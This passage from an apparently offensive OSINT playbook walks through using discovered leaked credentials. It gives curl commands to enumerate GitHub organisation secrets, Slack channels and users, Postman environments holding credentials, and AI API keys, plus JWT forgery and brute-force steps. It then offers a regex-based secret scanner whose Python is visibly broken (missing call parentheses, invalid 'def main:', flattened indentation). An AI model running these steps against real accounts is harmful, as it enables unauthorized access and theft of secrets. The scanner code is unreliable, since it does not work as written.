# Per-org: members, repos, secrets (secrets endpoint is metadata-only — names not values)
ORG="<orgname>"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/members"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/repos?per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/actions/secrets" # requires admin:org

# Per-repo workflow secrets (metadata)
REPO="<orgname/reponame>"
curl -sk -m 10 -H "$H" "https://api.github.com/repos/$REPO/actions/secrets"
```

**Slack token — workspace enum:**

```bash
TOKEN="xoxb-..."
H="Authorization: Bearer $TOKEN"

# auth.test already validated
# Identity details
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.identity" | jq .

# What conversations can I see? (sweeping check; respects scope)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/conversations.list?types=public_channel,private_channel,mpim,im&limit=200" | jq '.channels | {id, name, is_private}'

# Workspace info
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/team.info" | jq .

# User list (only if scope includes users:read)
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.list?limit=100" | jq '.members | {name, real_name, is_admin}'

# DO NOT: chat.postMessage, files.upload, conversations.invite, etc.
```

**JWT — full triage workflow:**

```bash
JWT="eyJhbGciOiJIUzI1NiI..."

# Decode header
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# Look for: alg (none = critical, HS256/HS384/HS512 = symmetric, RS256/RS512 = asymmetric, ES256 = ECDSA)
# Look for: kid (key ID — possible JKU/X5U injection target)
# Look for: jku, x5u (JKU/X5U values — control these = sign attacker JWTs)

# Decode payload
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Look for: exp (expired = downgraded), iat, nbf
# Look for: sub, iss, aud (identity disclosure)
# Look for: roles, scopes, permissions (privilege markers)
# Look for: sensitive claims (email, employee ID, SSN, etc.)

# Algorithm-confusion test (RS→HS)
# If alg is RS256, try crafting an HS256 token signed with the public key as secret
# Tools: jwt_tool, jwt-cracker

# Brute-force HS256 secret (if HS256 + short-secret suspicion)
hashcat -m 16500 "$JWT" /path/to/wordlist.txt
# Or: john --format=HMAC-SHA256 jwt-hash.txt --wordlist=...

# Check `none` algorithm bypass
# Re-encode header with alg=none and empty signature; some libraries accept
NEW_JWT=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
NEW_JWT="${NEW_JWT}.$(echo "$JWT" | cut -d. -f2)."
# Test against API
```

**Postman PMAK — workspace enum:**

```bash
PMAK="PMAK-..."
H="X-Api-Key: $PMAK"

# /me already done (validation)
curl -sk -m 10 -H "$H" https://api.getpostman.com/me | jq '.user'

# Workspaces
curl -sk -m 10 -H "$H" https://api.getpostman.com/workspaces | jq '.workspaces | {id, name, type}'

# Per-workspace collections
WS="<workspace-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.collections'
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.environments'

# Per-collection requests (where the secrets often live)
COL="<collection-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/collections/$COL" | jq '.collection.item'
# Run secret catalog over the JSON

# Environments (env vars often contain creds)
ENV="<environment-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/environments/$ENV" | jq '.environment.values | {key, value}'
```

**Anthropic API key — usage enum:**

```bash
KEY="sk-ant-api03-..."
H="x-api-key: $KEY"
A="anthropic-version: 2023-06-01"

# Models accessible
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/models | jq '.data | .id'

# Usage / quota (admin-scoped tokens only):
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/organizations/usage_report | jq .

# DO NOT: send actual completion requests against organization budget
```

**OpenAI API key — usage enum:**

```bash
KEY="sk-..."
H="Authorization: Bearer $KEY"

# Models
curl -sk -m 10 -H "$H" https://api.openai.com/v1/models | jq '.data | length'

# Org info (if key has org scope)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/organizations | jq .

# Files / fine-tunes (sometimes contain training data with PII)
curl -sk -m 10 -H "$H" https://api.openai.com/v1/files | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/fine_tuning/jobs | jq .
```

**Generic key — provenance enum:**

1. Find the consuming domain (where in JS bundle did the key appear? what URL is the bundle served from?).
2. Check the API docs of the inferred service.
3. If the key matches a known regex, lookup vendor-specific scope check.
4. If unknown service, search GitHub for the key prefix (`gh search code "<prefix>" --type=code`).
5. Identify scope before validating; some keys are write-broad on first use.

---


## 48. Runnable Helper — `secret_scan.py`

Drop-in Python helper that mirrors the 80-pattern catalog (§17). Pure stdlib, no dependencies. For operator use against captured text.

```python
#!/usr/bin/env python3
"""Stdlib-only secret scanner. Mirrors the 80-pattern catalog from
the `offensive-osint` skill (§17).

Usage:
 echo "YOUR_AWS_ACCESS_KEY_HERE" | python3 secret_scan.py
 python3 secret_scan.py file1.txt file2.js dir/

Output: one JSON object per line:
 {pattern, severity, category, match, source, line}

Exit codes:
 0 — completed (regardless of whether secrets found)
 2 — invalid arguments
"""
import json
import os
import re
import sys

SEV_CRITICAL = "critical"
SEV_HIGH = "high"
SEV_MEDIUM = "medium"
SEV_LOW = "low"

# Order matters: most-specific patterns first so generic catches
# don't pre-empt typed ones.
PATTERNS = [
 # AWS
 ("AWS_ACCESS_KEY", SEV_CRITICAL, "aws", r"\b(AKIA|ASIA)[0-9A-Z]{16}\b"),
 ("AWS_SECRET_TYPED", SEV_CRITICAL, "aws", r"(?i)aws[_\-]?secret[_\-]?access[_\-]?key['\"\s:=]+([A-Za-z0-9/+=]{40})"),
 ("AWS_SECRET_LOOSE", SEV_HIGH, "aws", r"(?i)aws(.{0,20})?(secret|sk)[\"'=: ]+([0-9a-z/+=]{40})"),

 # Google Cloud Platform
 ("GCP_SERVICE_ACCOUNT", SEV_CRITICAL, "gcp", r'"type"\s*:\s*"service_account"'),
 ("GOOGLE_API_KEY", SEV_HIGH, "gcp", r"\bAIza[0-9A-Za-z_\-]{35}\b"),

 # GitHub
 ("GH_PAT_CLASSIC", SEV_CRITICAL, "github", r"\bghp_[A-Za-z0-9]{36}\b"),
 ("GH_PAT_FINEGRAINED", SEV_CRITICAL, "github", r"\bgithub_pat_[A-Za-z0-9_]{82}\b"),
 ("GH_OAUTH", SEV_HIGH, "github", r"\bgho_[A-Za-z0-9]{36}\b"),
 ("GH_S2S", SEV_HIGH, "github", r"\bgh[usr]_[A-Za-z0-9]{36,}\b"),

 # Stripe
 ("STRIPE_LIVE", SEV_CRITICAL, "stripe", r"\bsk_live_[0-9A-Za-z]{24,}\b"),
 ("STRIPE_TEST", SEV_LOW, "stripe", r"\bsk_test_[0-9A-Za-z]{24,}\b"),

 # Slack
 ("SLACK_TOKEN", SEV_HIGH, "slack", r"\bxox[abpors]-[0-9A-Za-z\-]{10,48}\b"),
 ("SLACK_WEBHOOK", SEV_MEDIUM, "slack", r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+"),

 # Email service providers
 ("SENDGRID", SEV_HIGH, "email_svc", r"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b"),
 ("MAILGUN_V1", SEV_HIGH, "email_svc", r"\bkey-[0-9a-zA-Z]{32}\b"),
 ("MAILGUN_LOOSE", SEV_HIGH, "email_svc", r"\bkey-[0-9a-f]{32}\b"),

 # Twilio
 ("TWILIO_API", SEV_HIGH, "twilio", r"\bSK[0-9a-fA-F]{32}\b"),
 ("TWILIO_SID", SEV_MEDIUM, "twilio", r"\bAC[a-f0-9]{32}\b"),
 ("TWILIO_AUTH", SEV_HIGH, "twilio", r"(?i)twilio(.{0,20})?(auth|token)[\"'=: ]+([a-f0-9]{32})"),

 # PaaS
 ("HEROKU_API", SEV_MEDIUM, "paas", r"(?i)heroku(.{0,20})?api[\"'=: ]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"),

 # Firebase
 ("FIREBASE_URL", SEV_LOW, "firebase", r"\bhttps?://[a-z0-9\-]+\.firebaseio\.com\b"),

 # Tokens / auth headers
 ("JWT", SEV_MEDIUM, "jwt", r"\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b"),
 ("BEARER_AUTH", SEV_MEDIUM, "bearer", r"(?i)authorization[\"'=: ]+bearer\s+[A-Za-z0-9._\-]{20,}"),
 ("BASIC_AUTH_URL", SEV_MEDIUM, "basic_auth", r"https?://[^/\s:@]+:[^/\s:@]+@[^/\s]+"),

 # Private keys
 ("RSA_PRIVKEY", SEV_CRITICAL, "private_key", r"-----BEGIN RSA PRIVATE KEY-----"),
 ("EC_PRIVKEY", SEV_CRITICAL, "private_key", r"-----BEGIN EC PRIVATE KEY-----"),
 ("OPENSSH_PRIVKEY", SEV_CRITICAL, "private_key", r"-----BEGIN OPENSSH PRIVATE KEY-----"),
 ("GENERIC_PRIVKEY", SEV_CRITICAL, "private_key", r"-----BEGIN (DSA |PGP |)PRIVATE KEY-----"),

 # Generic
 ("GENERIC_API_KEY", SEV_MEDIUM, "generic", r"(?i)(?:api[_\-]?key|apikey|api_secret|access_token|secret[_\-]?token)['\"\s:=]+[\"']([A-Za-z0-9+/=_\-]{24,})[\"']"),

 # Modern AI APIs (v2.1)
 ("ANTHROPIC_API", SEV_CRITICAL, "ai_api", r"\bsk-ant-(?:api03|admin01)-[A-Za-z0-9_\-]{93,}\b"),
 ("OPENAI_LEGACY", SEV_CRITICAL, "ai_api", r"\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b"),
 ("OPENAI_PROJECT", SEV_CRITICAL, "ai_api", r"\bsk-proj-[A-Za-z0-9_\-]{40,}T3BlbkFJ[A-Za-z0-9_\-]{40,}\b"),
 ("OPENAI_SESSION", SEV_HIGH, "ai_api", r"\bsess-[A-Za-z0-9]{40}\b"),
 ("HUGGINGFACE", SEV_HIGH, "ai_api", r"\bhf_[A-Za-z0-9]{30,}\b"),

 # Cloud infra
 # §17 #35 — Cloudflare API Token: a bare 40-char token is far too generic to match
 # standalone (any base64/hex chunk collides), so it is anchored to cloudflare / X-Auth-Key
 # context on the same line, exactly as §17 specifies ("when paired with context").
 ("CLOUDFLARE_API_TOKEN", SEV_HIGH, "infra_api", r"(?i)(?:cloudflare|x-auth-key)['\"\s:=]{1,20}([A-Za-z0-9_\-]{40})\b"),
 ("CLOUDFLARE_API", SEV_CRITICAL, "infra_api", r"(?i)cf[_\-]?api[_\-]?key['\"\s:=]+([a-f0-9]{37})"),
 ("DIGITALOCEAN", SEV_HIGH, "infra_api", r"\bdop_v1_[a-f0-9]{64}\b"),

 # Package registries
 ("NPM_TOKEN", SEV_HIGH, "package_registry", r"\bnpm_[A-Za-z0-9]{36}\b"),
 ("PYPI_TOKEN", SEV_HIGH, "package_registry", r"\bpypi-AgENdGV[A-Za-z0-9_\-]+\b"),
 ("DOCKER_HUB_PAT", SEV_HIGH, "package_registry", r"\bdckr_pat_[A-Za-z0-9_\-]{27,}\b"),

 # SaaS
 ("ATLASSIAN_TOKEN", SEV_HIGH, "saas_api", r"\bATATT3xFfGF0[A-Za-z0-9_\-]{180,}\b"),
 ("LINEAR_API", SEV_MEDIUM, "saas_api", r"\blin_api_[A-Za-z0-9]{40}\b"),

 # Observability
 ("NEWRELIC_LICENSE", SEV_MEDIUM, "observability", r"\b(?:NRAA|NRAK|NRBR)-[A-F0-9]{27}\b"),
 ("DATADOG_API", SEV_HIGH, "observability", r"(?i)dd[_\-]?api[_\-]?key['\"\s:=]+([a-f0-9]{32})"),
 ("SENTRY_DSN", SEV_LOW, "observability", r"https://[a-f0-9]+@o[0-9]+\.ingest\.sentry\.io/[0-9]+"),

 # Tunneling
 ("NGROK_AUTH", SEV_MEDIUM, "tunneling", r"\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b"),

 # Bot tokens
 ("DISCORD_BOT", SEV_HIGH, "bot_token", r"\b[MN][A-Za-z\d]{23}\.[\w\-]{6}\.[\w\-]{27}\b"),
 ("TELEGRAM_BOT", SEV_HIGH, "bot_token", r"\b\d{8,10}:[A-Za-z0-9_\-]{35}\b"),

 # Provider expansion (v2.2) — §17 #49-80. A real-world Postman PMAK detector
 # plus well-known, distinctive-prefix provider token formats not covered
 # above. Every entry here is either a standalone distinctive-prefix regex or
 # context-anchored exactly like CLOUDFLARE_API_TOKEN above, so a bare generic
 # token can't FP-flood.

 # Postman (real-world PMAK detection regex)
 ("POSTMAN_PMAK", SEV_CRITICAL, "postman", r"\bPMAK-[A-Za-z0-9]{24,64}\b"),

 # GitLab
 ("GITLAB_PAT", SEV_HIGH, "gitlab", r"\bglpat-[A-Za-z0-9_\-]{20}\b"),

 # Square
 ("SQUARE_ACCESS_TOKEN", SEV_CRITICAL, "square", r"\bsq0atp-[0-9A-Za-z\-_]{22}\b"),
 ("SQUARE_OAUTH_SECRET", SEV_HIGH, "square", r"\bsq0csp-[0-9A-Za-z\-_]{43}\b"),

 # Shopify
 ("SHOPIFY_ACCESS_TOKEN", SEV_HIGH, "shopify", r"\bshpat_[a-fA-F0-9]{32}\b"),
 ("SHOPIFY_SHARED_SECRET",SEV_HIGH, "shopify", r"\bshpss_[a-fA-F0-9]{32}\b"),

 # Mailchimp
 ("MAILCHIMP_API_KEY", SEV_HIGH, "email_svc", r"\b[0-9a-f]{32}-us[0-9]{1,2}\b"),

 # PagerDuty / Asana / Databricks (§17 #56-58)
 ("PAGERDUTY_API_KEY", SEV_MEDIUM, "saas_api", r"(?i)pagerduty(.{0,20})?(api|token|key)['\"\s:=]+([A-Za-z0-9+_\-]{20,32})"),
 ("ASANA_PAT", SEV_MEDIUM, "saas_api", r"(?i)asana(.{0,20})?(token|pat)['\"\s:=]+([0-9]{1,10}/[0-9]{10,20}:[a-f0-9]{32})"),
 ("DATABRICKS_PAT", SEV_HIGH, "saas_api", r"\bdapi[0-9a-f]{32}(?:-\d)?\b"),

 # Grafana
 ("GRAFANA_API_KEY", SEV_MEDIUM, "observability", r"\beyJrIjoi[A-Za-z0-9+/=]{40,}\b"),
 ("GRAFANA_CLOUD_TOKEN", SEV_MEDIUM, "observability", r"\bglc_[A-Za-z0-9+/]{32,}={0,2}\b"),

 # Terraform Cloud / Enterprise
 ("TERRAFORM_CLOUD_TOKEN",SEV_CRITICAL, "infra_api", r"\b[A-Za-z0-9]{14}\.atlasv1\.[A-Za-z0-9_\-=]{60,70}\b"),

 # Fastly
 ("FASTLY_API_TOKEN", SEV_HIGH, "infra_api", r"(?i)fastly(.{0,20})?(api|token)['\"\s:=]+([A-Za-z0-9_\-]{32})"),

 # Algolia / Segment
 ("ALGOLIA_ADMIN_KEY", SEV_HIGH, "saas_api", r"(?i)algolia(.{0,20})?(admin|api)[_\-]?key['\"\s:=]+([A-Za-z0-9]{32})"),
 ("SEGMENT_WRITE_KEY", SEV_LOW, "saas_api", r"(?i)segment(.{0,20})?(write)?[_\-]?key['\"\s:=]+([A-Za-z0-9]{20,32})"),

 # Airtable
 ("AIRTABLE_KEY_LEGACY", SEV_MEDIUM, "saas_api", r"(?i)airtable(.{0,20})?(api)?[_\-]?key['\"\s:=]+(key[A-Za-z0-9]{14})"),
 ("AIRTABLE_PAT", SEV_HIGH, "saas_api", r"\bpat[A-Za-z0-9]{14}\.[a-f0-9]{64}\b"),

 # GCP / Google OAuth
 ("GCP_OAUTH_CLIENT_SECRET", SEV_HIGH, "gcp", r"\bGOCSPX-[A-Za-z0-9_\-]{28}\b"),
 ("GOOGLE_OAUTH_ACCESS_TOKEN", SEV_HIGH,"gcp", r"\bya29\.[0-9A-Za-z_\-]{20,}\b"),
 ("GOOGLE_OAUTH_CLIENT_ID",SEV_LOW, "gcp", r"\b[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com\b"),

 # Azure AD / Entra
 ("AZURE_AD_CLIENT_SECRET",SEV_HIGH, "azure", r"(?i)(?:azure|entra)[_\-]?(?:client|app)[_\-]?secret['\"\s:=]+([A-Za-z0-9_~.\-]{34,40})"),

 # Facebook OAuth
 ("FACEBOOK_ACCESS_TOKEN",SEV_HIGH, "oauth", r"\bEAA[A-Za-z0-9]{90,}\b"),

 # Package registries (v2.2)
 ("RUBYGEMS_API_KEY", SEV_HIGH, "package_registry", r"\brubygems_[a-f0-9]{48}\b"),

 # JFrog / Artifactory
 ("JFROG_API_KEY", SEV_HIGH, "infra_api", r"\bAKCp[A-Za-z0-9]{50,70}\b"),

 # Okta
 ("OKTA_SSWS_TOKEN", SEV_CRITICAL, "identity", r"\bSSWS\s+[0-9a-zA-Z_\-]{40}\b"),
 ("OKTA_API_TOKEN", SEV_HIGH, "identity", r"(?i)okta(.{0,20})?(api)?[_\-]?token['\"\s:=]+([0-9a-zA-Z_\-]{40})"),

 # Slack app-level (Socket Mode)
 ("SLACK_APP_LEVEL_TOKEN",SEV_HIGH, "slack", r"\bxapp-1-[A-Za-z0-9\-]{20,}\b"),

 # Dropbox
 ("DROPBOX_SHORT_LIVED", SEV_MEDIUM, "oauth", r"\bsl\.[A-Za-z0-9_\-]{130,140}\b"),

 # Secrets managers — Doppler / HashiCorp Vault
 ("DOPPLER_TOKEN", SEV_CRITICAL, "secrets_mgmt", r"\bdp\.pt\.[A-Za-z0-9]{40,44}\b"),
 ("VAULT_TOKEN", SEV_CRITICAL, "secrets_mgmt", r"\bhvs\.[A-Za-z0-9_\-]{90,100}\b"),

 # Firebase Cloud Messaging legacy server key (mobile-recon relevant, §21.1)
 ("FCM_SERVER_KEY", SEV_HIGH, "firebase", r"\bAAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}\b"),
]

COMPILED = [(n, s, c, re.compile(p)) for (n, s, c, p) in PATTERNS]


def scan_text(text: str, source: str = "<stdin>"):
 """Scan a text blob; yield one dict per match."""
 for line_no, line in enumerate(text.splitlines, start=1):
 for name, sev, cat, rx in COMPILED:
 for m in rx.finditer(line):
 yield {
 "pattern": name,
 "severity": sev,
 "category": cat,
 "match": m.group(0)[:80], # truncate to avoid huge dumps
 "source": source,
 "line": line_no,
 }


def scan_path(path: str):
 """Recursively scan a file or directory."""
 if os.path.isdir(path):
 for root, _, files in os.walk(path):
 # Skip common noisy directories
 if any(part in root for part in (".git", "node_modules", "__pycache__", ".venv", "venv", "dist", "build", ".cache")):
 continue
 for f in files:
 p = os.path.join(root, f)
 yield from scan_path(p)
 return
 try:
 # Skip large binary files (>10MB)
 if os.path.getsize(path) > 10 * 1024 * 1024:
 return
 with open(path, "r", errors="replace") as fh:
 yield from scan_text(fh.read, source=path)
 except (OSError, IOError):
 return


def main:
 if len(sys.argv) > 1:
 if sys.argv[1] in ("-h", "--help"):
 print(__doc__)
 sys.exit(0)
 for arg in sys.argv[1:]:
 for hit in scan_path(arg):
 print(json.dumps(hit))
 else:
 # Read from stdin
 try:
 data = sys.stdin.read
 except KeyboardInterrupt:
 sys.exit(0)
 for hit in scan_text(data):
 print(json.dumps(hit))


if __name__ == "__main__":
 main
```

Save as `secret_scan.py`, then:

```bash
python3 secret_scan.py path/to/repo/ # scan a directory tree
python3 secret_scan.py file1 file2 file3 # scan specific files
cat my.log | python3 secret_scan.py # pipe stdin
```

Output is JSONL — one finding per line — drops cleanly into `jq` for filtering or directly into a finding store.

---
